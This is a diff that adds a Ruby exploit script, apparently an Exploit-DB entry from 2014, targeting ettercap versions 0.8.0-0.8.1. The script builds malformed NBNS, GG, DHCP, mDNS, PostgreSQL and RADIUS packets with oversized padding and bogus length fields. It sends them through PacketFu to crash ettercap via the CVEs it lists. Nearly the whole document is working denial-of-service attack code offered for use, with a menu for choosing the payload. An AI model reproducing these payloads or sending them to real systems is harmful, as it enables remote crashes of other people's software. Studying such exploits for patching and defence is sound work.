@@ -1,0 +1,203 @@
+#Exploit Title: 6 Remote ettercap Dos exploits to 1
+#Date: 19/12/2014
+#Exploit Author: Nick Sampanis
+#Vendor Homepage: http://ettercap.github.io
+#Software Link: https://github.com/Ettercap/ettercap/archive/v0.8.1.tar.gz
+#Version: 8.0-8.1
+#Tested on: Linux
+#CVE: CVE-2014-6395 CVE-2014-9376 CVE-2014-9377 CVE-2014-9378 CVE-2014-9379
+#Make sure that you have installed packefu and pcaprub
+
+require 'packetfu'
+include PacketFu
+
+if ARGV.count < 4
+    puts "[-]Usage #{$PROGRAM_NAME} src_ip dst_ip src_mac iface"
+    puts "[-]Use valid mac for your interface, if you dont know"+
+        " victim's ip address use broadcast"
+    exit
+end
+
+def nbns_header
+    u = UDPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_daddr = ARGV[1]
+    u.ip_saddr = ARGV[0]
+    u.udp_src = 4444
+    u.udp_dst = 137
+    u.payload =  "\xa0\x2c\x01\x10\x00\x01\x00\x00\x00\x00\x00\x00"
+    u.payload << "\x20\x46\x48\x45\x50\x46\x43\x45\x4c\x45\x48\x46"#name
+    u.payload << "\x43\x45\x50\x46\x46\x46\x41\x43\x41\x43\x41\x43"#name
+    u.payload << "\x41\x43\x41\x43\x41\x43\x41\x41\x41\x00"#name
+    u.payload << "\x00\x20" #type
+    u.payload << "\x00\x01" #class
+    u.payload << "A"*1000 #pad
+    u.recalc
+    u.to_w(ARGV[3])
+end
+def gg_client
+    u = TCPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_saddr = ARGV[0]
+    u.ip_daddr = ARGV[1]
+    u.tcp_src = 3333
+    u.tcp_dst = 8074
+    u.payload = "\x15\x00\x00\x00"  #gg_type
+    u.payload << "\xe8\x03\x00\x00" #gg_len
+    u.payload << "A"*1000
+    u.recalc
+    u.to_w(ARGV[3])
+end
+def dhcp_header
+    u = UDPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_daddr = ARGV[0]
+    u.ip_saddr = ARGV[1]
+    u.udp_src = 67
+    u.udp_dst = 4444
+    u.payload =  "\x02"*236
+    u.payload << "\x63\x82\x53\x63"
+    u.payload << "\x35"
+    u.payload << "\x00\x05\x00"
+    u.payload << "\x51"
+    u.payload << "\x00" #size
+    u.payload << "A" * 3 #pad
+    u.recalc
+    u.to_w(ARGV[3])
+end
+
+def mdns_header
+    u = UDPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_daddr = ARGV[1]
+    u.ip_saddr = ARGV[0]
+    u.udp_src = 4444
+    u.udp_dst = 5353
+    u.payload =  "\x11\x11" #id
+    u.payload << "\x00\x00" #flags
+    u.payload << "\x00\x01" #questions
+    u.payload << "\x00\x00" #answer_rr
+    u.payload << "\x00\x00" #auth_rrs
+    u.payload << "\x00\x00" #additional_rr
+    u.payload << "\x06router\x05local\x00" #name
+    u.payload << "\x00\x01" #type
+    u.payload << "\x00\x01" #class
+    u.recalc
+    u.to_w(ARGV[3])
+end
+def mdns_dos_header
+    u = UDPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_daddr = ARGV[1]
+    u.ip_saddr = ARGV[0]
+    u.udp_src = 4444
+    u.udp_dst = 5353
+    u.payload =  "\x11\x11" #id
+    u.payload << "\x00\x00" #flags
+    u.payload << "\x00\x01" #questions
+    u.payload << "\x00\x00" #answer_rr
+    u.payload << "\x00\x00" #auth_rrs
+    u.payload << "\x00\x00" #additional_rr
+    u.payload << "\x01"
+    u.payload << "\x00\x01" #type
+    u.payload << "\x00\x01" #class
+    u.payload << "A"*500
+    u.recalc
+    u.to_w(ARGV[3])
+end
+
+def pgsql_server
+    u = TCPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_saddr = ARGV[1]
+    u.ip_daddr = ARGV[0]
+    u.tcp_src = 5432
+    u.tcp_dst = 3333
+    u.payload = "\x52\x00\x00\x00\x08\x00\x00\x00\x03\x73\x65\x72\x02\x74\x65\x73\x74\x00\x64\x61\x74\x61\x62\x61\x73\x65\x02\x74\x65\x73\x74\x00\x63\x6c\x69\x65\x6e\x74\x5f\x65\x6e\x63\x6f\x64\x69\x6e\x67\x00\x55\x4e\x49\x43\x4f\x44\x45\x00\x44\x61\x74\x65\x53\x74\x79\x6c\x65\x00\x49\x53\x4f\x00\x54\x69\x6d\x65\x5a\x6f\x6e\x65\x00\x55\x53\x2f\x50\x61\x63\x69\x66\x69\x63\x00\x00"
+    u.recalc
+    u.to_w(ARGV[3])
+end
+def pgsql_client
+    u = TCPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_saddr = ARGV[0]
+    u.ip_daddr = ARGV[1]
+    u.tcp_src = 3333
+    u.tcp_dst = 5432
+    u.payload = "\x70\x00\x00\x5b\x00\x03\x00\x00\x75\x73\x65\x72\x02\x74\x65\x73\x74\x00\x64\x61\x74\x61\x62\x61\x73\x65\x02\x74\x65\x73\x74\x00\x63\x6c\x69\x65\x6e\x74\x5f\x65\x6e\x63\x6f\x64\x69\x6e\x67\x00\x55\x4e\x49\x43\x4f\x44\x45\x00\x44\x61\x74\x65\x53\x74\x79\x6c\x65\x00\x49\x53\x4f\x00\x54\x69\x6d\x65\x5a\x6f\x6e\x65\x00\x55\x53\x2f\x50\x61\x63\x69\x66\x69\x63\x00\x00" 
+    u.recalc
+    u.to_w(ARGV[3])
+end
+
+def pgsql_client_shell
+    u = TCPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_saddr = ARGV[0]
+    u.ip_daddr = ARGV[1]
+    u.tcp_src = 3333
+    u.tcp_dst = 5432
+    u.payload = "\x70"
+    u.payload << "\x00\x00\x03\xe9" #len
+    u.payload << "A"*1000
+    u.payload << "\x00"
+    u.recalc
+    u.to_w(ARGV[3])
+end
+
+def radius_header
+    u = UDPPacket.new()
+    u.eth_saddr = ARGV[2]
+    u.eth_daddr = "ff:ff:ff:ff:ff:ff"
+    u.ip_daddr = ARGV[1]
+    u.ip_saddr = ARGV[0]
+    u.udp_src = 4444
+    u.udp_dst = 1645
+    u.payload = "\x01\x01\x00\xff\x00\x01\x00\x00\x00\x00\x00\x00\x20\x46\x48\x00\x50\x46\x43\xff\x01\x00\x48\x46\x01\x00\x50\x46\x46\x46\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41\x41\x00\x00\x20\x00\x01"
+    u.recalc
+    u.to_w(ARGV[3])
+end
+
+puts "[+]6 Remote ettercap Dos exploits to 1 by Nick Sampanis"
+puts "[+]-1- nbns plugin CVE-2014-9377"
+puts "[+]-2- gg dissector CVE-2014-9376"
+puts "[+]-3- dhcp dissector CVE-2014-9376"
+puts "[+]-4- mdns plugin CVE-2014-9378"
+puts "[+]-5- postgresql dissector CVE-2014-6395(works only in 8.0)"
+puts "[+]-6- radius dissector CVE-2014-9379"
+print "choice:"
+choice = $stdin.gets.chomp().to_i()
+
+case choice
+when 1
+    puts "[+]Sending nbns packet.."
+    nbns_header
+when 2
+    puts "[+]Sending client gg packet.."
+    gg_client
+when 3
+    puts "[+]Sending dhcp packet.."
+    dhcp_header
+when 4
+    puts "[+]Sending mdns packet.."
+    mdns_header
+    mdns_dos_header
+when 5
+    puts "[+]Sending pgsql packet.."
+    pgsql_client
+    pgsql_server
+    pgsql_client_shell
+when 6
+    puts "[+]Sending radius packet.."
+    radius_header
+else
+    puts "[-]Unrecognized command "
+end
+
